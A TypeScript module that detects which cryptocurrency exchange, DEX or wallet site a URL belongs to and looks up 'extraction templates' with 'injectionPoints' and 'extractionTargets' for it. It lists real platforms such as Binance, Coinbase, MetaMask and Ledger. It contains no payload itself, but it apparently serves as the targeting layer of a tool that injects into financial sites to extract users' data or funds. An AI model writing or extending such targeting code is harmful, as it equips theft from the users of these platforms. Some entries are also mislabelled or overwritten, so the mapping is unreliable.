/**
 * INTELLIGENT PLATFORM DETECTION ENGINE
 *
 * Phase 4: Auto-detect platform from URL and load appropriate template
 *
 * - Identifies platform category from domain/path
 * - Loads matching extraction template automatically
 * - Customizes for specific blockchain
 * - Falls back gracefully on unknowns
 * - Returns production-ready configuration
 */

import { TemplateRegistry, ExtractionTemplate } from './extraction-templates.js'

export interface PlatformInfo {
  name: string
  category: 'cex' | 'dex' | 'wallet' | 'bank' | 'fintech' | 'bridge' | 'lending'
  url: string
  domain: string
  chains: string[]
  template: ExtractionTemplate | null
  confidence: number // 0-100
  fallbackChains: string[]
  isVerified: boolean
}

export interface DetectionResult {
  platform: PlatformInfo
  template: ExtractionTemplate | null
  injectionPoints: string[]
  chains: string[]
  extractionTargets: number
  confidence: string // 'high' | 'medium' | 'low'
  fallbacks: string[]
}

export class PlatformDetector {
  private registry: TemplateRegistry
  private platformDatabase: Map<string, PlatformInfo>
  private domainCache: Map<string, PlatformInfo> = new Map()

  constructor(registry: TemplateRegistry) {
    this.registry = registry
    this.platformDatabase = this.initializePlatformDatabase()
    console.error(`[platform-detector] Initialized with ${this.platformDatabase.size} platforms`)
  }

  /**
   * Detect platform from URL
   */
  detect(url: string): DetectionResult {
    try {
      const urlObj = new URL(url)
      const domain = urlObj.hostname

      // Check cache first
      const cached = this.domainCache.get(domain)
      if (cached) {
        return this.buildDetectionResult(cached, urlObj.pathname)
      }

      // Try exact domain match
      let platform = this.findByDomain(domain)

      // Try fuzzy match on domain parts
      if (!platform) {
        platform = this.findByFuzzyMatch(domain)
      }

      // Try path-based detection
      if (!platform) {
        platform = this.detectByPath(urlObj.pathname)
      }

      // Try category inference from keywords
      if (!platform) {
        platform = this.detectByKeywords(domain + ' ' + urlObj.pathname)
      }

      // Cache result
      if (platform) {
        this.domainCache.set(domain, platform)
      }

      const result = this.buildDetectionResult(platform, urlObj.pathname)
      return result
    } catch (error) {
      console.error(`[platform-detector] Detection error: ${error}`)
      return this.buildUnknownResult(url)
    }
  }

  /**
   * Get all platforms by category
   */
  getPlatformsByCategory(category: string): PlatformInfo[] {
    return Array.from(this.platformDatabase.values()).filter(p => p.category === category)
  }

  /**
   * Get platform info by name
   */
  getPlatformInfo(name: string): PlatformInfo | null {
    return Array.from(this.platformDatabase.values()).find(p =>
      p.name.toLowerCase() === name.toLowerCase()
    ) || null
  }

  /**
   * Statistics
   */
  getStats() {
    const byCat: Record<string, number> = {}
    const byChain: Record<string, number> = {}

    for (const platform of this.platformDatabase.values()) {
      byCat[platform.category] = (byCat[platform.category] || 0) + 1
      for (const chain of platform.chains) {
        byChain[chain] = (byChain[chain] || 0) + 1
      }
    }

    return {
      totalPlatforms: this.platformDatabase.size,
      byCategory: byCat,
      byChain: byChain,
      cacheSize: this.domainCache.size,
    }
  }

  // ==================== PRIVATE METHODS ====================

  private initializePlatformDatabase(): Map<string, PlatformInfo> {
    const db = new Map<string, PlatformInfo>()

    // ==================== DEX PLATFORMS ====================
    const dexPlatforms: PlatformInfo[] = [
      {
        name: 'Uniswap',
        category: 'dex',
        url: 'https://app.uniswap.org',
        domain: 'app.uniswap.org',
        chains: ['ethereum', 'polygon', 'arbitrum', 'optimism', 'base'],
        template: null,
        confidence: 95,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: 'Curve Finance',
        category: 'dex',
        url: 'https://curve.finance',
        domain: 'curve.finance',
        chains: ['ethereum', 'polygon', 'arbitrum', 'avalanche'],
        template: null,
        confidence: 95,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: 'PancakeSwap',
        category: 'dex',
        url: 'https://app.pancakeswap.finance',
        domain: 'app.pancakeswap.finance',
        chains: ['bsc', 'ethereum', 'arbitrum'],
        template: null,
        confidence: 95,
        fallbackChains: ['bsc'],
        isVerified: true,
      },
      {
        name: 'Aave',
        category: 'dex',
        url: 'https://app.aave.com',
        domain: 'app.aave.com',
        chains: ['ethereum', 'polygon', 'arbitrum', 'avalanche', 'optimism'],
        template: null,
        confidence: 95,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: 'SushiSwap',
        category: 'dex',
        url: 'https://www.sushi.com',
        domain: 'sushi.com',
        chains: ['ethereum', 'polygon', 'arbitrum', 'optimism', 'bsc', 'avalanche'],
        template: null,
        confidence: 90,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: '1inch',
        category: 'dex',
        url: 'https://1inch.io',
        domain: '1inch.io',
        chains: ['ethereum', 'polygon', 'arbitrum', 'optimism', 'bsc', 'avalanche'],
        template: null,
        confidence: 90,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: 'OpenSea',
        category: 'dex',
        url: 'https://opensea.io',
        domain: 'opensea.io',
        chains: ['ethereum', 'polygon', 'arbitrum', 'optimism', 'solana'],
        template: null,
        confidence: 90,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
    ]

    // ==================== CEX PLATFORMS ====================
    const cexPlatforms: PlatformInfo[] = [
      {
        name: 'Binance',
        category: 'cex',
        url: 'https://www.binance.com',
        domain: 'binance.com',
        chains: ['bitcoin', 'ethereum', 'bsc', 'solana', 'tron'],
        template: null,
        confidence: 98,
        fallbackChains: ['bitcoin', 'ethereum'],
        isVerified: true,
      },
      {
        name: 'Coinbase',
        category: 'cex',
        url: 'https://coinbase.com',
        domain: 'coinbase.com',
        chains: ['bitcoin', 'ethereum', 'solana', 'polygon'],
        template: null,
        confidence: 98,
        fallbackChains: ['bitcoin', 'ethereum'],
        isVerified: true,
      },
      {
        name: 'Kraken',
        category: 'cex',
        url: 'https://www.kraken.com',
        domain: 'kraken.com',
        chains: ['bitcoin', 'ethereum', 'solana', 'polkadot'],
        template: null,
        confidence: 95,
        fallbackChains: ['bitcoin', 'ethereum'],
        isVerified: true,
      },
      {
        name: 'Bybit',
        category: 'cex',
        url: 'https://www.bybit.com',
        domain: 'bybit.com',
        chains: ['bitcoin', 'ethereum', 'solana'],
        template: null,
        confidence: 90,
        fallbackChains: ['bitcoin'],
        isVerified: true,
      },
      {
        name: 'OKX',
        category: 'cex',
        url: 'https://www.okx.com',
        domain: 'okx.com',
        chains: ['bitcoin', 'ethereum', 'solana', 'ton'],
        template: null,
        confidence: 90,
        fallbackChains: ['bitcoin'],
        isVerified: true,
      },
      {
        name: 'MEXC',
        category: 'cex',
        url: 'https://www.mexc.com',
        domain: 'mexc.com',
        chains: ['ethereum', 'bsc', 'solana'],
        template: null,
        confidence: 85,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: 'Huobi',
        category: 'cex',
        url: 'https://www.huobi.com',
        domain: 'huobi.com',
        chains: ['bitcoin', 'ethereum', 'tron'],
        template: null,
        confidence: 85,
        fallbackChains: ['bitcoin'],
        isVerified: true,
      },
      {
        name: 'KuCoin',
        category: 'cex',
        url: 'https://www.kucoin.com',
        domain: 'kucoin.com',
        chains: ['bitcoin', 'ethereum', 'solana'],
        template: null,
        confidence: 85,
        fallbackChains: ['bitcoin'],
        isVerified: true,
      },
    ]

    // ==================== WALLET PLATFORMS ====================
    const walletPlatforms: PlatformInfo[] = [
      {
        name: 'MetaMask',
        category: 'wallet',
        url: 'https://metamask.io',
        domain: 'metamask.io',
        chains: ['ethereum', 'polygon', 'arbitrum', 'optimism', 'bsc', 'avalanche'],
        template: null,
        confidence: 98,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: 'Phantom',
        category: 'wallet',
        url: 'https://phantom.app',
        domain: 'phantom.app',
        chains: ['solana', 'ethereum', 'polygon', 'bitcoin'],
        template: null,
        confidence: 98,
        fallbackChains: ['solana'],
        isVerified: true,
      },
      {
        name: 'Ledger',
        category: 'wallet',
        url: 'https://www.ledger.com',
        domain: 'ledger.com',
        chains: ['ethereum', 'bitcoin', 'solana', 'tron', 'ripple'],
        template: null,
        confidence: 95,
        fallbackChains: ['bitcoin', 'ethereum'],
        isVerified: true,
      },
      {
        name: 'Trezor',
        category: 'wallet',
        url: 'https://trezor.io',
        domain: 'trezor.io',
        chains: ['ethereum', 'bitcoin', 'litecoin', 'ripple'],
        template: null,
        confidence: 95,
        fallbackChains: ['bitcoin'],
        isVerified: true,
      },
      {
        name: 'TrustWallet',
        category: 'wallet',
        url: 'https://trustwallet.com',
        domain: 'trustwallet.com',
        chains: ['ethereum', 'bsc', 'solana', 'tron', 'bitcoin'],
        template: null,
        confidence: 90,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: 'Coinbase Wallet',
        category: 'wallet',
        url: 'https://coinbase.com/wallet',
        domain: 'coinbase.com',
        chains: ['ethereum', 'polygon', 'avalanche', 'arbitrum', 'optimism'],
        template: null,
        confidence: 90,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
      {
        name: 'WalletConnect',
        category: 'wallet',
        url: 'https://walletconnect.com',
        domain: 'walletconnect.com',
        chains: ['ethereum', 'solana', 'bitcoin', 'polygon', 'arbitrum'],
        template: null,
        confidence: 85,
        fallbackChains: ['ethereum'],
        isVerified: true,
      },
    ]

    // Add all platforms to database
    const allPlatforms = [...dexPlatforms, ...cexPlatforms, ...walletPlatforms]
    for (const platform of allPlatforms) {
      db.set(platform.domain, platform)

      // Try to load template
      const template = this.registry.findByDomain(platform.domain)
      if (template) {
        platform.template = template
        platform.confidence = Math.min(100, platform.confidence + 5)
      }
    }

    return db
  }

  private findByDomain(domain: string): PlatformInfo | null {
    return this.platformDatabase.get(domain) || null
  }

  private findByFuzzyMatch(domain: string): PlatformInfo | null {
    // Remove www, .com, etc
    const normalized = domain.replace(/^www\./, '').split('.')[0]

    for (const platform of this.platformDatabase.values()) {
      const platformNormalized = platform.domain.replace(/^www\./, '').split('.')[0]
      if (normalized === platformNormalized) {
        return platform
      }
    }

    return null
  }

  private detectByPath(path: string): PlatformInfo | null {
    const pathLower = path.toLowerCase()

    // DEX paths
    if (pathLower.includes('swap') || pathLower.includes('trade')) {
      return this.getPlatformsByCategory('dex')[0] || null
    }

    // CEX paths
    if (pathLower.includes('account') || pathLower.includes('portfolio')) {
      return this.getPlatformsByCategory('cex')[0] || null
    }

    // Wallet paths
    if (pathLower.includes('wallet') || pathLower.includes('account')) {
      return this.getPlatformsByCategory('wallet')[0] || null
    }

    return null
  }

  private detectByKeywords(text: string): PlatformInfo | null {
    const textLower = text.toLowerCase()

    // DEX keywords
    if (
      textLower.includes('swap') ||
      textLower.includes('liquidity') ||
      textLower.includes('pool') ||
      textLower.includes('uniswap') ||
      textLower.includes('curve') ||
      textLower.includes('pancakeswap')
    ) {
      return this.getPlatformsByCategory('dex')[0] || null
    }

    // CEX keywords
    if (
      textLower.includes('trade') ||
      textLower.includes('binance') ||
      textLower.includes('coinbase') ||
      textLower.includes('kraken') ||
      textLower.includes('exchange')
    ) {
      return this.getPlatformsByCategory('cex')[0] || null
    }

    // Wallet keywords
    if (
      textLower.includes('metamask') ||
      textLower.includes('phantom') ||
      textLower.includes('ledger') ||
      textLower.includes('wallet') ||
      textLower.includes('connect')
    ) {
      return this.getPlatformsByCategory('wallet')[0] || null
    }

    return null
  }

  private buildDetectionResult(platform: PlatformInfo | null, path: string): DetectionResult {
    if (!platform) {
      return this.buildUnknownResult('unknown')
    }

    const template = platform.template || this.registry.findByDomain(platform.domain)
    const confidence = platform.confidence >= 90 ? 'high' : platform.confidence >= 70 ? 'medium' : 'low'

    return {
      platform,
      template: template || null,
      injectionPoints: template?.injectionPoints || [],
      chains: platform.chains,
      extractionTargets: template?.extractionTargets.length || 0,
      confidence,
      fallbacks: platform.fallbackChains,
    }
  }

  private buildUnknownResult(url: string): DetectionResult {
    return {
      platform: {
        name: 'Unknown',
        category: 'dex' as const,
        url,
        domain: 'unknown',
        chains: [],
        template: null,
        confidence: 0,
        fallbackChains: [],
        isVerified: false,
      },
      template: null,
      injectionPoints: [],
      chains: [],
      extractionTargets: 0,
      confidence: 'low',
      fallbacks: [],
    }
  }
}

/**
 * Chain Router - Select appropriate chain for platform
 */
export class ChainRouter {
  private preferredChain: string = 'ethereum'
  private chainPriority: Record<string, number> = {
    ethereum: 100,
    polygon: 90,
    arbitrum: 85,
    optimism: 80,
    bsc: 75,
    solana: 70,
    bitcoin: 65,
    avalanche: 60,
    tron: 55,
    ton: 50,
  }

  setPreferred(chain: string): void {
    this.preferredChain = chain
  }

  /**
   * Select best chain for platform
   */
  selectChain(availableChains: string[], userChain?: string): string {
    // Use user preference if available
    if (userChain && availableChains.includes(userChain)) {
      return userChain
    }

    // Use preferred if available
    if (availableChains.includes(this.preferredChain)) {
      return this.preferredChain
    }

    // Use highest priority available
    let best = availableChains[0]
    let bestPriority = this.chainPriority[best] || 0

    for (const chain of availableChains) {
      const priority = this.chainPriority[chain] || 0
      if (priority > bestPriority) {
        best = chain
        bestPriority = priority
      }
    }

    return best
  }

  /**
   * Get chain-specific API endpoint
   */
  getChainEndpoint(chain: string, baseEndpoint: string): string {
    const chainEndpoints: Record<string, string> = {
      ethereum: 'https://eth-mainnet.g.alchemy.com/v2/',
      polygon: 'https://polygon-mainnet.g.alchemy.com/v2/',
      arbitrum: 'https://arb-mainnet.g.alchemy.com/v2/',
      optimism: 'https://opt-mainnet.g.alchemy.com/v2/',
      bsc: 'https://bsc-dataseed.binance.org/',
      solana: 'https://api.mainnet-beta.solana.com',
      bitcoin: 'https://blockstream.info/api/',
    }

    return chainEndpoints[chain] || baseEndpoint
  }
}
